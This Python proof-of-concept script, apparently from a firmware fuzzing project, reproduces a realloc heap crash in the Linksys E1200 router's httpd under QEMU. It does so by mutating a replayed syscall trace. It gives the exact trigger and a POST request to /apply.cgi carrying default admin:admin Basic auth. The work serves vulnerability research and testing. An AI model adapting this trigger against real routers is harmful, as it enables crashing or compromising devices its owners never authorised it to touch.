#!/usr/bin/env python3
"""
poc_e1200_heap.py — PoC for NB-E1200-01

Crash: SIGSEGV in realloc() when httpd processes POST /apply.cgi with
inflated read() retval. Single network mutation sufficient — 100% deterministic.

NB-E1200-01 (minimal — NETWORK-EXPLOITABLE):
  Signal: SIGSEGV  PC: 0x2b498000 (realloc+0x150)
  Trigger: http_extend at idx=138 — inflate read retval 116→1024
  → httpd processes 1024B of POST body from a 116B buffer
  → realloc() receives corrupted size → SIGSEGV

  One mutation, 100% crash rate, zero file-FD dependency.

NB-E1200-01 (campaign variants, for reference):
  7ed84369: pc=0x2b4980c8 (realloc+0x218), campaign recipe with extra mutations
  a5b07455: pc=0x2b498000 (realloc+0x150), campaign recipe with extra mutations
  Both campaign recipes contained incidental file_fd_retval mutations that are
  NOT required — stripped net-only also crashes on round 1.

Trace: tests/seeds/Linksys_E1200_post.trace (171 syscalls, 2026-04-10)
  accept@65(GET), accept@104(POST), read(fd=7)@136(256B), read(fd=7)@138(116B)
  fork_point=104

Usage:
  cd rr_fuzzing/fuzzing
  python3 ../tests/scripts/fuzzing/poc_e1200_heap.py [--max-rounds N] [--gdb]

GDB (with --gdb):
  gdb-multiarch tests/verified_targets/Linksys_E1200/rootfs/usr/sbin/httpd
  (gdb) set architecture mips
  (gdb) target remote :9998
  (gdb) continue
"""
import sys, argparse
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT / 'fuzzing'))

from conductor.qemu_executor import QEMUExecutor
from conductor.conductor_types import FuzzInstruction

ROOTFS     = str(ROOT / 'tests/verified_targets/Linksys_E1200/rootfs')
BUILD      = str(ROOT / '../../build')
BINARY     = f'{ROOTFS}/usr/sbin/httpd'
TRACE      = str(ROOT / 'tests/seeds/Linksys_E1200_post.trace')
FORK_POINT = 104
GDB_PORT   = 9998

# MINIMAL — single mutation, 100% deterministic, purely network-controlled
# http_extend at idx=138: inflate read(fd=7) retval from 116 → 1024
# httpd processes 1024B POST body from a 116B buffer → realloc overflow
MUTATIONS_MINIMAL = [
    FuzzInstruction(syscall_index=138, cmd=8, arg_index=1,
                    data=b'\x00\x04\x00\x00', offset=0, size=4,
                    mutation_type='http_extend'),
]

# FULL — original campaign recipe (7ed84369), extra mutations confirmed NOT required
MUTATIONS_7ED84369 = [
    FuzzInstruction(syscall_index=136, cmd=2, arg_index=1,
                    data=b'VersEkleContr', offset=0, size=13,
                    mutation_type='dictionary_multi'),
    FuzzInstruction(syscall_index=138, cmd=8, arg_index=1,
                    data=b'\x00\x04\x00\x00', offset=0, size=4,
                    mutation_type='http_extend'),
    FuzzInstruction(syscall_index=138, cmd=5, arg_index=1,
                    data=(b'POST /apply.cgi HTTP/1.1\r\n'
                          b'Host: 127.0.0.1\r\n'
                          b'Authorization: Basic YWRtaW46YWRtaW4=\r\n\r\n'),
                    offset=0, size=84, mutation_type='http_request'),
    FuzzInstruction(syscall_index=147, cmd=8, arg_index=1,
                    data=b'\x04\x00\x00\x00', offset=0, size=4,
                    mutation_type='extend'),
    FuzzInstruction(syscall_index=152, cmd=11, arg_index=1,
                    data=b'\x04\x04', offset=0, size=2,
                    mutation_type='overwrite_offset'),
]

VARIANTS = {
    'minimal':   (MUTATIONS_MINIMAL,   0x2b498000, 'NB-E1200-01 minimal (1 mutation)'),
    '7ed84369':  (MUTATIONS_7ED84369,  0x2b4980c8, 'NB-E1200-01 campaign (7ed84369)'),
}


def run_poc(max_rounds: int, gdb_mode: bool, variant: str):
    mutations, expected_pc, label = VARIANTS[variant]
    extra_args = ['-g', str(GDB_PORT)] if gdb_mode else []

    if gdb_mode:
        print(f'\nConnect GDB:')
        print(f'  gdb-multiarch {BINARY}')
        print(f'  (gdb) set architecture mips')
        print(f'  (gdb) target remote :{GDB_PORT}')
        print(f'  (gdb) continue\n')

    executor = QEMUExecutor(
        qemu_path=f'{BUILD}/qemu-mipsel',
        target_binary=BINARY,
        ld_prefix=ROOTFS,
        timeout=15.0,
        extra_qemu_args=extra_args,
    )

    print(f'[*] {label} PoC')
    print(f'[*] Target    : {BINARY}')
    print(f'[*] Trace     : {TRACE}')
    print(f'[*] Mutations : {len(mutations)} — NETWORK-EXPLOITABLE (no file-FD required)')
    print()

    found = False
    for rnd in range(1, max_rounds + 1):
        results = executor.execute_fork(
            trace_file=TRACE,
            fork_point=FORK_POINT,
            mutation_variants=[mutations],
            depth=0,
            iteration_id=rnd,
        )

        if not results:
            if rnd % 50 == 0:
                print(f'  round {rnd:4d}: no result')
            continue

        r = results[0]
        crashed = getattr(r, 'crashed', False)
        sig     = getattr(r, 'signal_number', None)
        pc      = hex(getattr(r, 'pc', 0) or 0)

        if crashed:
            print(f'  round {rnd:4d}: *** CRASH ***  pc={pc}  signal={sig}')
            found = True
            break
        elif rnd % 50 == 0:
            print(f'  round {rnd:4d}: {getattr(r, "status_name", "ok")}')

    executor.stop_persistent_qemu()

    print()
    if found:
        print(f'★ NB-E1200-01 CONFIRMED: pc={pc}  signal={sig}')
        print(f'  realloc heap overflow via oversized POST body — NETWORK-EXPLOITABLE')
    else:
        print(f'✗ Not reproduced in {max_rounds} rounds')
    return found


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--max-rounds', type=int, default=10)
    ap.add_argument('--gdb',        action='store_true')
    ap.add_argument('--variant',    default='minimal',
                    choices=list(VARIANTS.keys()))
    args = ap.parse_args()
    run_poc(args.max_rounds, args.gdb, args.variant)


if __name__ == '__main__':
    main()
